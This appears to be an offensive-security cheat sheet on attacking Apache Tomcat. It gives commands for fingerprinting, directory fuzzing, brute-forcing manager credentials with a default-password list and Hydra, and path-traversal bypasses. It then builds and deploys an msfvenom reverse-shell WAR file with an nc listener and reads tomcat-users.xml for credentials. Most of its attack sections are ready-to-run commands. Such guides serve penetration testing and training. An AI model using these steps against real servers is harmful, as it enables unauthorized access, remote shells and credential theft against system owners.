# Apache Tomcat

## Theory

Apache Tomcat (called "Tomcat" for short) is a free and open-source implementation of the Jakarta Servlet, Jakarta Expression Language, and WebSocket technologies. It provides a "pure Java" HTTP web server environment in which Java code can also run.

## Practice

#### Enumeration

{% tabs %}
{% tab title="Fingerprinting" %}
We can attempt to trigger an error on the website as a method of fingerprinting. If the error is similar as the one below, this indicates that the website is running Tomcat.

```bash
$ curl http://target.com/DoesNotExist
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="Version Identification" %}
To find the version of Apache Tomcat, a simple command can be executed:

```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat 
```

This will search for the term "Tomcat" in the documentation index page, revealing the version in the title tag of the HTML response.
{% endtab %}

{% tab title="Manager Files Location" %}
Identifying the exact locations of **`/manager`** and **`/host-manager`** directories is crucial as their names might be altered. A brute-force search is recommended to locate these pages.

```bash
ffuf -u https://example.com/FUZZ -w directories.txt
ffuf -u https://example.com/host-manager/FUZZ -w 
ffuf -u https://example.com/manager/FUZZ -w directories.txt
```

Below are common directories for Apache Tomcat.

```
/examples
/examples/jsp/cal/login.html
/examples/jsp/error/error.html
/examples/jsp/snp/snoop.jsp
/examples/servlet/HelloWorldEXample
/examples/servlet/JndiServlet
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestParamExample

/host-manager

/manager
/manager/jmxproxy/?qry=STUFF
/manager/status
/manager/status/all
# We can execute commands in /manager/text/ directory
/manager/text/{command}?{parameters}
/manager/text/deploy?path=/foo
/manager/text/list
/manager/text/resources
/manager/text/serverinfo
/manager/text/vminfo
```
{% endtab %}

{% tab title="Username Enumeration" %}
&#x20;It's possible to enumerate usernames through metasploit:

{% hint style="warning" %}
It only works for Tomcat versions **older than 6**
{% endhint %}

```bash
msf> use auxiliary/scanner/http/tomcat_enum
msf> set TARGETURI /manager  # depending on the website
```
{% endtab %}
{% endtabs %}

#### Credentials

{% tabs %}
{% tab title="Default Credentials" %}
The **`/manager/html`** directory is particularly sensitive as it allows the upload and deployment of WAR files, which can lead to code execution. This directory is protected by basic HTTP authentication, with common credentials being:

```
admin:(empty)
admin:admin
admin:password
admin:password1
admin:Password1
admin:tomcat
manager:manager
root:changethis
root:password
root:password1
root:root
root:r00t
root:toor
tomcat:(empty)
tomcat:admin
tomcat:changethis
tomcat:password
tomcat:password1
tomcat:s3cret
tomcat:tomcat
```
{% endtab %}

{% tab title="Brute Force Attack" %}
To attempt a brute force attack on the manager directory, we may use one of the following commands:

```bash
# FFUF
ffuf -u https://tomcat:FUZZ@example.com/manager -w passwords.txt -fs 140

# Hydra
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f <TARGET> http-get /manager/html
```
{% endtab %}
{% endtabs %}

#### Common Vulnerabilities <a href="#common-vulnerabilities" id="common-vulnerabilities"></a>

{% tabs %}
{% tab title="Path Traversal Exploit" %}
In some [**vulnerable configurations of Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) you can gain access to protected directories in Tomcat using the path: `/..;/`

So, for example, you might be able to **access the Tomcat manager** page by accessing: `www.vulnerable.com/lalala/..;/manager/html`

**Another way** to bypass protected paths using this trick is to access `http://www.vulnerable.com/;param=value/manager/html`
{% endtab %}

{% tab title="Password Backtrace Disclosure" %}
Accessing `/auth.jsp` may reveal the password in a backtrace under fortunate circumstances.
{% endtab %}

{% tab title="Double URL Encoding" %}
The CVE-2007-1860 vulnerability in `mod_jk` allows for double URL encoding path traversal, enabling unauthorized access to the management interface via a specially crafted URL.

In order to access to the management web of the Tomcat go to: `pathTomcat/%252E%252E/manager/html`
{% endtab %}

{% tab title="/examples" %}
Apache Tomcat versions 4.x to 7.x include example scripts that are susceptible to information disclosure and cross-site scripting (XSS) attacks. These scripts, listed comprehensively, should be checked for unauthorized access and potential exploitation. Find [more info here](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp
{% endtab %}
{% endtabs %}

#### Remote Code Execution (RCE)

{% tabs %}
{% tab title="Uploading WAR file " %}
If you have access to the Tomcat Web Application Manager, you can **upload and deploy a .war file (execute code)**.

{% hint style="warning" %}
You will only be able to deploy a WAR if you have **enough privileges** (roles: **admin**, **manager** and **manager-script**).
{% endhint %}

First create a war file using Msfvenom.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<local-ip> LPORT=80 -f war -o shell.war
```

Then upload this file.

```bash
curl --upload-file shell.war -u 'tomcat:password' "https://example.com/manager/text/deploy?path=/shell"
```

Start a listener in local machine.

```bash
sudo rlwrap nc -lvnp 80
```

Now access to `https://example.com/shell`. We should get a shell.
{% endtab %}
{% endtabs %}

#### Post-Exploitation

{% tabs %}
{% tab title="Crential Access" %}
If we are in the target system, we can retrieve information about credentials.

```bash
find / -name "tomcat-users.xml" 2>/dev/null
cat tomcat-users.xml
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat" %}

{% embed url="https://exploit-notes.hdks.org/exploit/web/apache-tomcat-pentesting/" %}
